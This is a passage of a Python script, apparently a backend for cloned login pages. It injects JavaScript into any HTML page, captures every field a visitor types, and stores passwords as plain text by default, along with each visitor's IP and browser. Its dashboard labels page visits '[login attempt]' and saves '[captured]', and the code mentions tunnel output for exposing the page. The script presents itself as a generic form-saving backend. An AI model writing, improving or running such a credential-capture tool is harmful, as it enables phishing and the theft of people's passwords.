#!/usr/bin/env python3
"""
html_backend_builder.py  -  Termux / Linux / Windows / macOS

Gives any HTML page a backend that saves form input to a JSON file.

  * Serves your HTML at http://127.0.0.1:8000 (page works unchanged)
  * Saves every submit (button click OR Enter key) to <name>_data.json
    in the same folder as the HTML file
  * Passwords are saved as clean text (as typed). Use --hash-passwords
    if you want them hashed instead.

Usage:
    python html_backend_builder.py page.html
    python html_backend_builder.py page.html --port 5000
    python html_backend_builder.py page.html --hash-passwords
    python html_backend_builder.py            (asks for the path)

Standard library only - no pip install needed.
"""
import argparse
import hashlib
import json
import mimetypes
import os
import signal
import re
import secrets
import shutil
import sys
import tempfile
import threading
import uuid
from collections import deque
from datetime import datetime, timezone
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import unquote, urlparse
import atexit
import codecs
import time
import unicodedata

try:
    import termios            # Linux / macOS / Termux
except ImportError:
    termios = None
try:
    import msvcrt             # Windows
except ImportError:
    msvcrt = None

MAX_BODY = 1_000_000
PBKDF2_ROUNDS = 200_000
LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()
_LIVE_BOX = {"open": False, "width": 0}
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
BLOCKED_EXT = {".py", ".json", ".env", ".db", ".sqlite"}

# Alternate-screen escape codes - the same trick full-screen terminal apps
# like htop, vim and less use. Switching to the alternate buffer makes this
# program take over the whole tab/window like a real application; leaving
# it instantly restores the user's previous terminal content untouched.
_ALT_SCREEN_ON = "\033[?1049h\033[2J\033[H"                 # switch buffer + clear + home
_ALT_SCREEN_OFF = "\033[0m\033[?7h\033[?25h\033[?1049l"     # reset + wrap on + cursor on + switch back

_ANSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]|\x1b[@-_]")
_CTRL_RE = re.compile(r"[\x00-\x1f\x7f-\x9f]")

_SCREEN = {
    "active": False,          # is the full-screen view currently drawn?
    "alt": False,             # are we inside the alternate screen buffer?
    "size": None,             # last (cols, rows) the frame was drawn for
    "header": [],             # plain status lines shown under the logo
    "log": deque(maxlen=1000),  # activity history (plain text lines)
}

# Injected into the page. Captures button clicks, Enter key and form submits,
# de-duplicates them, and posts the values to /api/save.
INJECT_JS = """
<script>
(function () {
  var lastSig = '', lastTime = 0;

  function label(el, t) {
    return el.name || el.id || el.getAttribute('aria-label') ||
           el.placeholder || t;
  }
  function collect(scope) {
    var out = [];
    scope.querySelectorAll('input,textarea,select').forEach(function (el) {
      var t = (el.type || el.tagName).toLowerCase();
      if (['submit','button','reset','image','file','hidden'].indexOf(t) > -1) return;
      if ((t === 'checkbox' || t === 'radio') && !el.checked) return;
      out.push({ name: label(el, t), type: t, value: el.value });
    });
    return out;
  }
  function send(scope, formId) {
    var fields = collect(scope);
    if (!fields.some(function (f) { return String(f.value).trim() !== ''; })) return;
    var body = JSON.stringify({ form: formId, fields: fields });
    var now = Date.now();
    if (body === lastSig && now - lastTime < 1500) return;   // duplicate event
    lastSig = body; lastTime = now;
    fetch('/api/save', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: body,
      keepalive: true
    }).then(function (r) { return r.json(); })
      .then(function (j) { console.log('[backend]', j); })
      .catch(function (e) { console.error('[backend] save failed', e); });
  }
  function scopeOf(el) { return el.closest('form') || document; }
  function idOf(s) { return s === document ? 'page' : (s.id || s.name || 'form'); }

  document.addEventListener('submit', function (e) {
    send(e.target, idOf(e.target));
  }, true);

  document.addEventListener('click', function (e) {
    var b = e.target.closest && e.target.closest(
      'button,input[type=submit],input[type=button],[role=button]');
    if (!b) return;
    var s = scopeOf(b);
    send(s, idOf(s));
  }, true);

  document.addEventListener('keydown', function (e) {
    if (e.key !== 'Enter' || e.isComposing) return;
    var el = e.target;
    if (!el || !el.tagName) return;
    var tag = el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'select') return;
    var t = (el.type || '').toLowerCase();
    if (['button','submit','reset','checkbox','radio'].indexOf(t) > -1) return;
    var s = scopeOf(el);
    send(s, idOf(s));
  }, true);
})();
</script>
"""


# ====================================================================== #
#  UI FRAMEWORK - white / grey text on the terminal's own background,    #
#  with a single orange accent color for headers, borders and choices.  #
#  Falls back to plain text automatically on a terminal that can't      #
#  render color or box-drawing characters (CI logs, dumb terminals).    #
# ====================================================================== #
def _color_enabled():
    if os.environ.get("NO_COLOR") is not None:
        return False
    if os.environ.get("FORCE_COLOR") is not None:
        return True
    return sys.stdout.isatty()


class Theme:
    ORANGE = "\033[38;5;214m"
    WHITE = "\033[97m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    OK = "\033[92m"
    ERR = "\033[91m"
    RESET = "\033[0m"


class _NoTheme:
    def __getattr__(self, _name):
        return ""


C = Theme() if _color_enabled() else _NoTheme()


def _term_width():
    try:
        return max(48, min(os.get_terminal_size().columns - 2, 76))
    except Exception:
        return 68


def print_box(lines, title=None, color=None):
    """Draws one bordered box. `lines` are plain strings (no color codes)
    so width math stays correct; color is applied only when printing.
    Any line longer than the box wraps onto extra lines instead of
    breaking the border."""
    import textwrap

    color = color or C.GREY
    w = _term_width()
    inner = w - 4
    top = f"{color}+{'-' * (w - 2)}+{C.RESET}"
    bot = f"{color}+{'-' * (w - 2)}+{C.RESET}"
    out = [top]
    if title:
        t = f" {title} "
        pad = max(w - 2 - len(t), 0)
        left = pad // 2
        right = pad - left
        out.append(f"{color}|{C.RESET}{C.BOLD}{C.ORANGE}{' ' * left}{t}{' ' * right}{C.RESET}{color}|{C.RESET}")
        out.append(f"{color}+{'-' * (w - 2)}+{C.RESET}")
    for line in lines:
        if line == "":
            out.append(f"{color}|{' ' * (w - 2)}|{C.RESET}")
            continue
        wrapped = textwrap.wrap(line, width=inner) or [""]
        for piece in wrapped:
            pad = max(inner - len(piece), 0)
            out.append(f"{color}| {C.RESET}{C.WHITE}{piece}{' ' * pad} {color}|{C.RESET}")
    out.append(bot)
    sys.stdout.write("\n".join(out) + "\n")
    sys.stdout.flush()


def _is_tty():
    try:
        return sys.stdout.isatty()
    except Exception:
        return False


def _term_size():
    """(columns, rows) of the real terminal. Asked from the OS on every
    call (never from stale COLUMNS/LINES variables), so a zoom or a resize
    is always noticed."""
    try:
        sz = os.get_terminal_size(sys.stdout.fileno())
    except Exception:
        sz = shutil.get_terminal_size(fallback=(80, 24))
    return max(sz.columns, 20), max(sz.lines, 4)


# ---- text helpers: every row is measured in terminal CELLS, not chars ---- #
def _cw(text):
    n = 0
    for ch in text:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def _clean(text):
    """Strips escape codes / control characters from any text before it is
    drawn. Anything that comes from outside (http requests, cloudflared
    output) can therefore never move the cursor or break the frame."""
    text = _ANSI_RE.sub("", str(text)).expandtabs(4)
    return _CTRL_RE.sub("", text)


def _fit(text, width):
    out, n = "", 0
    for ch in text:
        w = _cw(ch)
        if n + w > width:
            break
        out += ch
        n += w
    return out


def _wrap(text, width, indent=0):
    """Hard-wraps by cell width (long URLs / paths never overflow the box)."""
    text = _clean(text)
    out, cur, curw, lim, pre = [], "", 0, width, ""
    for ch in text:
        w = _cw(ch)
        if curw + w > lim and cur:
            out.append(pre + cur)
            cur, curw, lim, pre = "", 0, max(width - indent, 1), " " * indent
        cur += ch
        curw += w
    out.append(pre + cur)
    return out


# ---- keyboard noise: no echo, no "^[[A" garbage while the dashboard runs -- #
_TERM_SAVED = {"attrs": None}


def _echo_off():
    """Touch-scrolling / arrow keys send escape codes to the program. With
    echo on, the terminal prints them as ^[[A^[[B ... over the screen.
    Echo and line mode are switched off while the dashboard is up (Ctrl+C
    still works) and restored exactly afterwards."""
    if termios is None:
        return
    try:
        if not sys.stdin.isatty():
            return
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        new = termios.tcgetattr(fd)
        new[3] &= ~(termios.ECHO | termios.ICANON)
        new[6][termios.VMIN] = 0
        new[6][termios.VTIME] = 0
        termios.tcsetattr(fd, termios.TCSADRAIN, new)
        _TERM_SAVED["attrs"] = old
    except Exception:
        pass


def _echo_restore():
    old = _TERM_SAVED["attrs"]
    if old is None or termios is None:
        return
    _TERM_SAVED["attrs"] = None
    try:
        fd = sys.stdin.fileno()
        termios.tcflush(fd, termios.TCIFLUSH)      # throw away unread keys
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    except Exception:
        pass


def _drain_input():
    """Reads and discards any pending keystrokes so they never pile up and
    leak into the shell after the program exits."""
    try:
        if msvcrt is not None:
            while msvcrt.kbhit():
                msvcrt.getwch()
        elif termios is not None and sys.stdin.isatty():
            import select
            fd = sys.stdin.fileno()
            while select.select([fd], [], [], 0)[0]:
                if not os.read(fd, 1024):
                    break
    except Exception:
        pass


# ---- full-screen app --------------------------------------------------- #
def enter_app_screen():
    """Switches into the alternate screen buffer so the program takes over
    the whole tab/window like htop or vim. Skipped when output is not a
    terminal (pipes, CI logs)."""
    if _is_tty() and not _SCREEN["alt"]:
        _SCREEN["alt"] = True
        sys.stdout.write(_ALT_SCREEN_ON)
        sys.stdout.flush()
        # Echo is switched off for the program's entire run, not just the
        # dashboard: a touch-scroll or pinch-zoom can fire escape sequences
        # at ANY step (even one that never reads input, like this check),
        # and with the terminal's own echo on those get printed as raw
        # "^[[A^[[B..." before any of this program's code sees them.
        # safe_input() does its own manual, filtered echo while reading
        # text, so turning the terminal's echo off everywhere is safe.
        _echo_off()
        atexit.register(leave_app_screen)


def leave_app_screen():
    """Restores the user's normal terminal exactly as it was before."""
    with PRINT_LOCK:
        _SCREEN["active"] = False
        if _SCREEN["alt"]:
            _SCREEN["alt"] = False
            try:
                sys.stdout.write(_ALT_SCREEN_OFF)
                sys.stdout.flush()
            except Exception:
                pass
    _echo_restore()


def set_dashboard_header(lines):
    """Plain-text status lines shown under the IQchain logo block."""
    _SCREEN["header"] = lines


def start_dashboard():
    """Switches from the step-by-step setup screens into the full-screen
    view: IQchain logo + developer credit pinned on top, status lines under
    it, and the scrolling activity lines below. A small watcher thread
    re-draws the frame whenever the terminal is zoomed / resized, and
    quietly swallows stray key presses."""
    if not (_is_tty() and _SCREEN["alt"]):
        # no real terminal -> plain, ordinary printed lines
        for line in _SCREEN["header"]:
            print(_clean(line))
        return
    with PRINT_LOCK:                              # echo is already off, set by
        _SCREEN["active"] = True                  # enter_app_screen() at startup
        _SCREEN["size"] = None
        sys.stdout.write("\033[?25l\033[?7l")     # hide cursor, no auto-wrap
        _redraw_dashboard()
    sig = getattr(signal, "SIGWINCH", None)       # instant repaint the moment
    if sig is not None:                           # the terminal reports a resize
        try:
            signal.signal(sig, lambda *_: _on_resize_signal())
        except Exception:
            pass
    threading.Thread(target=_watch_screen, daemon=True).start()


def _on_resize_signal():
    with PRINT_LOCK:
        if _SCREEN["active"]:
            _redraw_dashboard()


def _watch_screen():
    tick = 0
    while True:
        time.sleep(0.2)
        _drain_input()
        tick += 1
        with PRINT_LOCK:
            if not _SCREEN["active"]:
                return
            # redraw on any size change, and once a second to self-heal
            if _term_size() != _SCREEN["size"] or tick % 5 == 0:
                _redraw_dashboard()


def _build_frame(cols, rows):
    """Returns the list of screen rows (already colored) for a terminal of
    `cols` x `rows`. Every row is exactly the same width and the list is
    never taller than the terminal, so the frame cannot wrap, overflow or
    scroll - at any zoom level."""
    w = max(min(cols - 1, 160), 30)
    inner = w - 4
    B, R = C.ORANGE, C.RESET

    def rule(left, right):
        return f"{B}{left}{'─' * (w - 2)}{right}{R}"

    def line(text="", color=None, bold=False, center=False):
        text = _fit(text, inner)
        gap = inner - _cw(text)
        left = gap // 2 if center else 0
        style = (C.BOLD if bold else "") + (C.WHITE if color is None else color)
        return f"{B}│{R} {style}{' ' * left}{text}{' ' * (gap - left)}{R} {B}│{R}"

    brand = f"{APP_NAME}  {APP_VERSION}"
    credit = f"developed by {APP_AUTHOR}"
    short = f"{brand}  {APP_TAG}"
    if _cw(short) > inner:
        short = f"{APP_NAME} {APP_VERSION}"

    compact_head = [rule("┌", "┐"),
                    line(short, C.ORANGE, True, True),
                    line(credit, C.GREY, False, True),
                    rule("├", "┤")]
    full_head = None
    logo = _logo_lines()
    if len(logo[0]) <= inner:
        full_head = [rule("┌", "┐"), line("")]
        full_head += [line(g, C.ORANGE, True, True) for g in logo]
        full_head += [line(""),
                      line(brand, C.WHITE, False, True),
                      line(APP_TAG, C.ORANGE, True, True),
                      line(credit, C.GREY, False, True),
                      rule("├", "┤")]

    status = [line(p) for s in _SCREEN["header"] for p in _wrap(s, inner)]
    bottom = rule("└", "┘")

    # big logo only when there is still room for a few activity rows
    head = compact_head
    if full_head and rows - (len(full_head) + len(status) + 1) >= 3:
        head = full_head

    avail = rows - len(head) - len(status) - 1          # rows left for the log
    if avail < 2:                                        # tiny window: no log area
        body = status[:max(len(status) + min(avail, 0), 0)]
        return (head + body + [bottom])[:rows]

    # "LIVE ACTIVITY" title is shown only when at least one activity row
    # still fits under it; otherwise it is dropped first, never the frame.
    want_title = avail >= 3
    title_rows = [rule("├", "┤"), line("LIVE ACTIVITY", C.ORANGE, True, True)] if want_title else []
    log_rows = avail - 1 - (2 if want_title else 0)      # one row is the divider

    shown = []                                           # newest at the bottom
    for entry in reversed(_SCREEN["log"]):
        txt = _clean(entry)
        if txt.startswith(("[error]", "[warn]")):
            color = C.ERR
        elif txt.startswith(("[login attempt]", "[captured]")):
            color = C.ORANGE
        else:
            color = C.WHITE
        shown = [(_fit(txt, inner), color)] + shown     # one entry = one row
        if len(shown) >= log_rows:
            break
    shown = shown[-log_rows:] if log_rows > 0 else []
    blanks = [line("")] * max(log_rows - len(shown), 0)
    rows_out = head + status + title_rows + [rule("├", "┤")] + blanks
    rows_out += [line(seg, color) for seg, color in shown] + [bottom]
    return rows_out[:rows]


def _redraw_dashboard():
    """Paints the frame row by row at absolute screen positions (no
    newlines, so the screen can never scroll). Called with PRINT_LOCK held."""
    cols, rows = _term_size()
    frame = _build_frame(cols, rows)
    out = []
    if _SCREEN["size"] != (cols, rows):
        out.append("\033[2J")               # size changed: wipe leftovers once
    _SCREEN["size"] = (cols, rows)
    for i, row in enumerate(frame, 1):
        out.append(f"\033[{i};1H{row}\033[K")
    if len(frame) < rows:
        out.append(f"\033[{len(frame) + 1};1H\033[J")
    try:
        sys.stdout.write("".join(out))
        sys.stdout.flush()
    except (OSError, ValueError):
        pass


def live_box_line(text, color=None):
    """Records one line of activity (http hits, saved records, tunnel
    output). While the full-screen view is active the frame is re-drawn so
    the newest line appears at the bottom; otherwise it prints normally."""
    text = _clean(text)
    with PRINT_LOCK:
        _SCREEN["log"].append(text)
        if _SCREEN["active"]:
            _redraw_dashboard()
        else:
            print(f"{color or C.WHITE}{text}{C.RESET}")


def live_box_close():
    """Leaves the full-screen view, restoring the real terminal."""
    leave_app_screen()


def _consume_escape(fd):
    """Called right after an ESC (0x1b) byte. A touchscreen terminal
    (Termux included) can fire arrow-key, mouse-tracking or bracketed-paste
    escape sequences on a swipe, pinch-zoom or stray tap. Those always
    arrive as a burst starting with ESC, so: wait up to 100ms for the next
    byte - nothing more means a lone Escape key press, nothing to do; a
    '[' or 'O' means a CSI/SS3 sequence, so keep reading until its final
    byte and throw the whole thing away. Either way, not one byte of it is
    echoed or inserted into the typed text."""
    old = termios.tcgetattr(fd)
    tmp = termios.tcgetattr(fd)
    tmp[6][termios.VMIN] = 0
    tmp[6][termios.VTIME] = 1
    termios.tcsetattr(fd, termios.TCSANOW, tmp)
    try:
        nxt = os.read(fd, 1)
        if nxt in (b"[", b"O"):
            for _ in range(32):                 # hard cap: never hang on junk
                b = os.read(fd, 1)
                if not b or 0x40 <= b[0] <= 0x7E:
                    break
    finally:
        termios.tcsetattr(fd, termios.TCSANOW, old)


def _safe_input_posix(prompt):
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    new = termios.tcgetattr(fd)
    new[3] &= ~(termios.ECHO | termios.ICANON)
    new[6][termios.VMIN] = 1
    new[6][termios.VTIME] = 0
    termios.tcsetattr(fd, termios.TCSADRAIN, new)
    decoder = codecs.getincrementaldecoder("utf-8")(errors="ignore")
    buf = []
    try:
        while True:
            ch = os.read(fd, 1)
            if not ch:
                raise EOFError
            if ch == b"\x1b":
                _consume_escape(fd)             # swallow it, never echoed
                continue
            if ch in (b"\r", b"\n"):
                sys.stdout.write("\n")
                break
            if ch == b"\x03":
                raise KeyboardInterrupt
            if ch == b"\x04" and not buf:
                raise EOFError
            if ch in (b"\x7f", b"\x08"):
                if buf:
                    buf.pop()
                    sys.stdout.write("\b \b")
                continue
            text = decoder.decode(ch)
            if text and (text.isprintable() or text == " "):
                buf.append(text)
                sys.stdout.write(text)
            sys.stdout.flush()
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return "".join(buf)


def _safe_input_windows(prompt):
    buf = []
    while True:
        ch = msvcrt.getwch()
        if ch in ("\r", "\n"):
            sys.stdout.write("\n")
            break
        if ch == "\x03":
            raise KeyboardInterrupt
        if ch == "\x08":
            if buf:
                buf.pop()
                sys.stdout.write("\b \b")
            continue
        if ch in ("\x00", "\xe0"):
            msvcrt.getwch()                     # swallow arrow/function scan code
            continue
        if ch.isprintable():
            buf.append(ch)
            sys.stdout.write(ch)
        sys.stdout.flush()
    return "".join(buf)


def safe_input(prompt=""):
    """Drop-in replacement for input(). A plain input() relies on the
    terminal's own line editing and echo, so a swipe, pinch-zoom or stray
    touch that fires escape sequences gets echoed and inserted verbatim
    (the '^[B^[B...' garbage). safe_input reads and echoes one keystroke
    at a time itself, so it can recognize and discard a whole escape
    sequence before it ever reaches the screen or the typed text - only
    what the person actually typed comes back."""
    sys.stdout.write(prompt)
    sys.stdout.flush()
    if not sys.stdin.isatty() or (termios is None and msvcrt is None):
        return input()                          # no real terminal: plain input() is fine
    try:
        if msvcrt is not None:
            return _safe_input_windows(prompt)
        return _safe_input_posix(prompt)
    except (termios.error if termios else Exception, OSError):
        return input()                          # unusual terminal: fall back safely


def _pause_before_exit():
    """Used right before a fatal error closes the full-screen app, so the
    message on screen is actually read before the terminal is restored -
    the same way a full-screen app waits for a keypress before quitting."""
    try:
        safe_input(f"{C.GREY}Press Enter to exit...{C.RESET}")
    except (EOFError, KeyboardInterrupt):
        pass


# ---------------------------------------------------------------------- #
#  BRAND BANNER - IQchain logo, version and developer credit             #
# ---------------------------------------------------------------------- #
APP_NAME = "IQchain"
APP_VERSION = "v0.01"
APP_AUTHOR = "IQmaxx (DK)"
APP_TAG = "(backend)"

# Bold dot-matrix wordmark, 6 rows tall, letters hand-aligned so every
# row is exactly the same length - verified column by column, so it
# can never render ragged or off-center on any terminal.
_LOGO_FONT = {
    "I": ["#####", "  #  ", "  #  ", "  #  ", "#####", "     "],
    "Q": [" ##### ", "##   ##", "##   ##", "## # ##", " ##### ", "    ## "],
    "C": [" ##### ", "##     ", "##     ", "##     ", " ##### ", "       "],
    "H": ["##   ##", "##   ##", "#######", "##   ##", "##   ##", "       "],
    "A": [" ##### ", "##   ##", "#######", "##   ##", "##   ##", "       "],
    "N": ["##   ##", "###  ##", "## # ##", "##  ###", "##   ##", "       "],
}
_LOGO_WORD = "IQCHAIN"


def _logo_lines():
    rows = ["" for _ in range(6)]
    for i, ch in enumerate(_LOGO_WORD):
        glyph = _LOGO_FONT[ch]
        for r in range(6):
            rows[r] += glyph[r]
            if i != len(_LOGO_WORD) - 1:
                rows[r] += " "
    return rows


def print_banner():
    """Logo, version, the '(backend)' tag and the developer credit, all
    inside one clean unicode-bordered frame (orange accent) - a proper
    frame around the brand, not bare floating text. Drawn with the same
    straight-line style as the live dashboard; every other box in the
    program (print_box) is left exactly as it was."""
    w = _term_width()
    inner = w - 4
    logo = _logo_lines()
    logo_w = len(logo[0])

    def row(text, color=C.WHITE, bold=False):
        pad = max(inner - len(text), 0)
        left = pad // 2
        right = pad - left
        b = C.BOLD if bold else ""
        return f"{C.ORANGE}│{C.RESET} {b}{color}{' ' * left}{text}{' ' * right}{C.RESET} {C.ORANGE}│{C.RESET}"

    def blank():
        return f"{C.ORANGE}│{' ' * (w - 2)}│{C.RESET}"

    lines = [f"{C.ORANGE}┌{'─' * (w - 2)}┐{C.RESET}", blank()]
    if logo_w <= inner:
        lines.extend(row(glyph, color=C.ORANGE, bold=True) for glyph in logo)
    else:
        lines.append(row(APP_NAME, color=C.ORANGE, bold=True))
    lines.append(blank())
    lines.append(row(f"{APP_NAME}  {APP_VERSION}"))
    lines.append(row("(backend)", color=C.ORANGE, bold=True))
    lines.append(row(f"developed by {APP_AUTHOR}", color=C.GREY))
    lines.append(blank())
    lines.append(f"{C.ORANGE}└{'─' * (w - 2)}┘{C.RESET}")

    print()
    sys.stdout.write("\n".join(lines) + "\n")


def print_farewell():
    """Printed on the REAL terminal, right below the command the user ran,
    after the full-screen app has closed: logo + (backend) tag + developer
    credit, then a closing status box and a goodbye line."""
    print_banner()
    print()
    print_box(["Stopped."], title="STOPPED", color=C.GREY)
    sys.stdout.write(f"\n{C.BOLD}{C.ORANGE}  Thanks for using {APP_NAME} - come again!{C.RESET}\n")
    sys.stdout.write(f"{C.GREY}  developed by {APP_AUTHOR}{C.RESET}\n\n")
    sys.stdout.flush()


def step_header(n, total, title):
    label = f"STEP {n}/{total}  -  {title.upper()}"
    print()
    sys.stdout.write(f"{C.BOLD}{C.ORANGE}{label}{C.RESET}\n")
    sys.stdout.write(f"{C.GREY}{'-' * min(len(label), _term_width())}{C.RESET}\n")


def ok_line(text):
    sys.stdout.write(f"{C.OK}  OK  {C.RESET}{C.WHITE}{text}{C.RESET}\n")


# ------------------------------------------------------------ helpers ----
def setup_console():
    """Cross-platform console setup for Termux, Linux, macOS and Windows.
    1) Forces UTF-8 output so the box-drawing / logo characters never
       crash on a narrow codepage.
    2) On Windows, cmd.exe and older PowerShell windows don't interpret
       ANSI escape codes unless Virtual Terminal processing is switched
       on - this does that, using only the standard library (ctypes),
       so the green/orange boxes render instead of raw escape text.
       Any failure here is swallowed, since _color_enabled() and
       _NoTheme already give a safe plain-text fallback."""
    for s in (sys.stdout, sys.stderr):
        try:
            s.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    if os.name == "nt":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
            STD_OUTPUT_HANDLE = -11
            STD_ERROR_HANDLE = -12
            for handle_id in (STD_OUTPUT_HANDLE, STD_ERROR_HANDLE):
                handle = kernel32.GetStdHandle(handle_id)
                mode = ctypes.c_uint32()
                if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                    kernel32.SetConsoleMode(
                        handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING
                    )
        except Exception:
            pass


def clean_path(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.lower().startswith("file:"):
        raw = unquote(urlparse(raw).path)
        if os.name == "nt" and len(raw) > 2 and raw[0] == "/" and raw[2] == ":":
            raw = raw[1:]
    return Path(os.path.expandvars(os.path.expanduser(raw)))


def read_html(path):
    data = path.read_bytes()
    if data.startswith((b"\xff\xfe", b"\xfe\xff")):
        return data.decode("utf-16", errors="replace")
    for enc in ("utf-8-sig", "cp1252"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            pass
    return data.decode("latin-1", errors="replace")


def inject(html):
    m = list(re.finditer(r"</body\s*>", html, re.IGNORECASE))
    if m:
        i = m[-1].start()
        return html[:i] + INJECT_JS + html[i:]
    return html + INJECT_JS


class FieldScanner(HTMLParser):
    """Lists detected inputs at startup (display only)."""
    def __init__(self):
        super().__init__()
        self.found = []

    def handle_starttag(self, tag, attrs):
        if tag in ("input", "textarea", "select"):
            a = dict(attrs)
            t = (a.get("type") or tag).lower()
            if t not in ("submit", "button", "reset", "image", "file", "hidden"):
                self.found.append((a.get("name") or a.get("id") or a.get("placeholder") or t, t))


# ------------------------------------------------------------ storage ----
def hash_password(pw):
    salt = secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), bytes.fromhex(salt), PBKDF2_ROUNDS)
    return f"pbkdf2_sha256${PBKDF2_ROUNDS}${salt}${dk.hex()}"


def build_record(payload, plain_passwords, meta):
    if not isinstance(payload, dict) or not isinstance(payload.get("fields"), list):
        raise ValueError("invalid payload")
    data = {}
    for f in payload["fields"][:200]:
        if not isinstance(f, dict):
            continue
        name = str(f.get("name", "field"))[:100]
        ftype = str(f.get("type", "text")).lower()[:20]
        value = str(f.get("value", ""))[:10000]
        if ftype == "email":
            value = value.strip().lower()
            if value and not EMAIL_RE.match(value):
                raise ValueError(f"invalid email in '{name}'")
        elif ftype == "password":
            if value and not plain_passwords:
                value = hash_password(value)
        elif ftype != "textarea":
            value = value.strip()
        if name in data:
            if not isinstance(data[name], list):
                data[name] = [data[name]]
            data[name].append(value)
        else:
            data[name] = value
    if not any(str(v).strip() for v in data.values()):
        raise ValueError("no data")
    return {
        "id": uuid.uuid4().hex,
        "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "form": str(payload.get("form", "form"))[:100],
        "data": data,
        **meta,
    }


def save_record(db_path, record):
    with LOCK:
        db = {"records": []}
        if db_path.exists():
            try:
                loaded = json.loads(db_path.read_text(encoding="utf-8"))
                if isinstance(loaded, dict) and isinstance(loaded.get("records"), list):
                    db = loaded
                else:
                    raise ValueError
            except Exception:
                backup = db_path.with_suffix(".corrupt.json")
                os.replace(db_path, backup)
                live_box_line(f"[warn] bad JSON moved to {backup.name}")
        db["records"].append(record)
        db["total"] = len(db["records"])
        fd, tmp = tempfile.mkstemp(dir=str(db_path.parent), suffix=".tmp")
        try:
            with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh:
                json.dump(db, fh, indent=2, ensure_ascii=False)
                fh.write("\n")
            os.replace(tmp, db_path)
        except Exception:
            if os.path.exists(tmp):
                os.remove(tmp)
            raise
        return len(db["records"])


# ------------------------------------------------------------- server ----
class Handler(BaseHTTPRequestHandler):
    server_version = "HtmlBackend/2.0"

    def log_message(self, fmt, *args):
        pass  # no raw "GET ... 200" lines; do_GET/do_POST log clear events instead

    def _send(self, code, body, ctype="application/json; charset=utf-8"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body, ensure_ascii=False).encode("utf-8")
        elif isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        cfg = self.server.cfg
        path = unquote(urlparse(self.path).path)
        if path in ("/", "/" + cfg["html"].name):
            try:
                page = inject(read_html(cfg["html"]))
            except OSError as e:
                return self._send(500, {"ok": False, "error": str(e)})
            live_box_line(f"[login attempt] page opened - ip: {self.client_address[0]}")
            return self._send(200, page, "text/html; charset=utf-8")

        target = (cfg["base"] / path.lstrip("/")).resolve()
        try:
            target.relative_to(cfg["base"])
        except ValueError:
            return self._send(403, {"ok": False, "error": "forbidden"})
        if (not target.is_file() or target.name.startswith(".")
                or target.suffix.lower() in BLOCKED_EXT or target == cfg["db"]):
            return self._send(404, {"ok": False, "error": "not found"})
        ctype = mimetypes.guess_type(str(target))[0] or "application/octet-stream"
        self._send(200, target.read_bytes(), ctype)

    def do_POST(self):
        if urlparse(self.path).path != "/api/save":
            return self._send(404, {"ok": False, "error": "not found"})
        origin = self.headers.get("Origin")
        if origin and urlparse(origin).netloc != self.headers.get("Host"):
            return self._send(403, {"ok": False, "error": "bad origin"})
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0
        if length <= 0 or length > MAX_BODY:
            return self._send(413, {"ok": False, "error": "bad size"})
        meta = {
            "ip": self.client_address[0],
            "user_agent": (self.headers.get("User-Agent") or "")[:200],
        }
        try:
            payload = json.loads(self.rfile.read(length).decode("utf-8"))
            record = build_record(payload, self.server.cfg["plain"], meta)
            total = save_record(self.server.cfg["db"], record)
        except (ValueError, UnicodeDecodeError) as e:
            return self._send(400, {"ok": False, "error": str(e)})
        except OSError as e:
            return self._send(500, {"ok": False, "error": f"save failed: {e}"})
        live_box_line(
            f"[captured] #{total} ip: {meta['ip']} - form '{record['form']}' - fields: {list(record['data'])}"
        )
        self._send(200, {"ok": True, "id": record["id"], "total": total})


class QuietServer(ThreadingHTTPServer):
    """Same server, but errors go to the activity area instead of being
    printed raw over the full-screen display."""
    daemon_threads = True

    def handle_error(self, request, client_address):
        exc = sys.exc_info()[1]
        if isinstance(exc, (BrokenPipeError, ConnectionResetError, ConnectionAbortedError)):
            return                      # browser closed the tab - harmless
        live_box_line(f"[error] {client_address[0]}: {type(exc).__name__}: {exc}")


def main():
    setup_console()
    ap = argparse.ArgumentParser(description="Build a JSON-saving backend for an HTML file")
    ap.add_argument("html", nargs="?", help="path to the HTML file")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--host", default="127.0.0.1",
                    help="default 127.0.0.1 (this device only); 0.0.0.0 for LAN/testers")
    ap.add_argument("--hash-passwords", action="store_true",
                    help="hash passwords (PBKDF2) instead of saving them as typed")
    args = ap.parse_args()

    # ---- the whole program, from this line to the very end, runs inside
    # the alternate screen buffer: the instant it activates it takes over
    # the full terminal/tab like a standalone application - whatever was
    # already on screen (earlier commands, scrollback) is hidden for the
    # entire run and reappears untouched only after this exits. ----------
    enter_app_screen()
    try:
        print_banner()
        step_header(1, 3, "Choose the HTML file")
        raw = args.html
        if not raw:
            try:
                raw = safe_input(f"{C.WHITE}HTML file path: {C.RESET}")
            except (EOFError, KeyboardInterrupt):
